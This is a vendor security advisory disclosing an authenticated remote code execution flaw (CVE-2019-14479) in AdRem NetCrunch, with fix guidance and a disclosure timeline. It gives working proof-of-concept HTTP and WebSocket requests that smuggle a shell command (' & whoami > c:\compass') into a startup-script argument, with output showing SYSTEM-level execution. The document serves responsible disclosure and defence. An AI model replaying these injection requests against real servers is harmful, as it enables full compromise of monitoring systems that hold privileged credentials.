# COMPASS SECURITY ADVISORY

#
################################################################################
#
# Product: NetCrunch
# Vendor: AdRem
# CSNC ID: CSNC-2019-014
# CVE ID: CVE-2019-14479
# Subject: Remote Code Execution
# Risk: High
# Effect: Remotely exploitable
# Authors: Sylvain Heiniger
# Thierry Viaccoz
# Fabio Poloni
# Date: 26.07.2019
#
################################################################################
Introduction:
-------------
NetCrunch [1] is a so-called "agentless" monitoring solution developed by
AdRem. It allows system administrators to monitor, visualize and get alerts
from many kinds of systems in their network. The solution consists of a server
and a fat client (also called console), as well as a web client.
Due to its architecture, the monitoring server is a critical system as it
holds credentials, most of the time privileged, for all monitored system.
Compass Security identified a remote code execution vulnerability in the AdRem
NetCrunch web client. Successful exploitation requires authentication and can
be performed remotely. A read-only administrator can execute arbitrary code on
the server running the NetCrunch server software.
Affected:
---------
Initially vulnerable:
\* AdRem NetCrunch 10.6.0.4587 (via POST request)
\* AdRem NetCrunch 10.6.1.4607 (via WebSockets only)
Not vulnerable:
\* AdRem NetCrunch 10.8.1
No other version was tested, but it is believed that older versions are also
vulnerable.
Technical Description:
----------------------
The web client communicates with the NetCrunch server over an RCP interface.
In the first test performed, interaction with the RPC interface could be
performed via a REST API. Example request:
POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=967561493 HTTP/1.1
Host: some-server
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Connection: close
Content-Length: 290
[{"action":"AppServerObject$1","method":"@create","data":[1074],"type":"rpc","tid":8}]
Response:
HTTP/1.1 200 OK
Connection: close
Content-Type: text/json; charset=UTF-8
Content-Length: 252
Cache-control: no-cache
Date: Tue, 14 May 2019 12:53:49 GMT
Pragma: no-cache
Server: AdRem WebApp Server
[{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@create","result":true}]
A method to test a "Startup Script" is offered by the web service. Although it
accepts only scripts (ending in .bat or .cmd) as input, arbitrary code can be
injected in the parameters to the script.
HTTP request to create a so-called "AppServerObject" and perform the
"TestStartupScript" request (with ID 1074) with code injection (" & whoami >
c:\\compass") in the arguments to the script
(c:\\windows\\system32\\sconfig.cmd):
POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=967561493 HTTP/1.1
Host: some-server
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Connection: close
Content-Length: 321
[{"action":"AppServerObject$1","method":"@create","data":[1074],"type":"rpc","tid":8},{"action":"AppServerObject$1","method":"request","data":[2,["c:\\windows\\system32\\sconfig.cmd"," & whoami > c:\\compass",true,3]],"type":"rpc","tid":8},{"action":"AppServerObject$1","method":"@destroy", "data":[],"type":"rpc","tid":8}]
The HTTP response shows no failure:
HTTP/1.1 200 OK
Connection: close
Content-Type: text/json; charset=UTF-8
Content-Length: 252
Cache-control: no-cache
Date: Tue, 14 May 2019 14:07:01 GMT
Pragma: no-cache
Server: AdRem WebApp Server
[{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@create","result":true},{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"request","result":{"Result":[]}},{"type":"rpc","tid":8,"action":"AppServerObject$1","method":"@destroy"}]
On the NetCrunch server, it can be observed that the code was executed with
"NT AUTHORITY\SYSTEM" rights:
c:\>type compass
nt authority\system
After an update to version 10.6.1.4607, the REST API as described above does
not allow this operation anymore. However, the web client also communicates
via WebSockets. Session establishment:
GET /ncsrv/dashboards/summary/1768565116 HTTP/1.1
Host: some-server
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://some-server
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
Server response:
HTTP/1.1 101 Web Socket Protocol Handshake
Upgrade: websocket
Connection: Upgrade
Server: Adrem WebApp Server
Access-Control-Allow-Origin: https://some-server
Access-Control-Allow-Credentials: True
Access-Control-Allow-Headers: content-type
Sec-WebSocket-Origin: https://some-server
Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
A first WebSocket message is sent to the server to create the "AppServerObject":
ncsrv{"dat":[1074],"call":"AppServerObject$1.create","tid":123}
And the following WebSocket response is received:
r{"type":"rpc","tid":123,"result":522018528}
A second WebSocket request is send to execute the request:
ncsrv{"dat":[2,["c:\\windows\\system32\\sconfig.cmd"," & whoami > c:\\compass",true,3]],"call":"AppServerObject$1.request","tid":61}
And the following response is received:
r{"type":"rpc","tid":61,"result":{"Result":[]}}
On the NetCrunch server, it can be observed that the code was executed with
"NT AUTHORITY\SYSTEM" rights:
c:\>type compass
nt authority\system
Workaround / Fix:
-----------------
Do not allow execution of arbitrary code on the NetCrunch server via scripts.
Escape user input in order to prevent from injecting commands in the arguments.
As a NetCrunch customer, update your installation to the latest version to
receive the fix.
Timeline:
---------
2019-05-23: Discovery by Sylvain Heiniger, Thierry Viaccoz and Fabio Poloni
2019-08-01: Assigned CVE-2019-14479
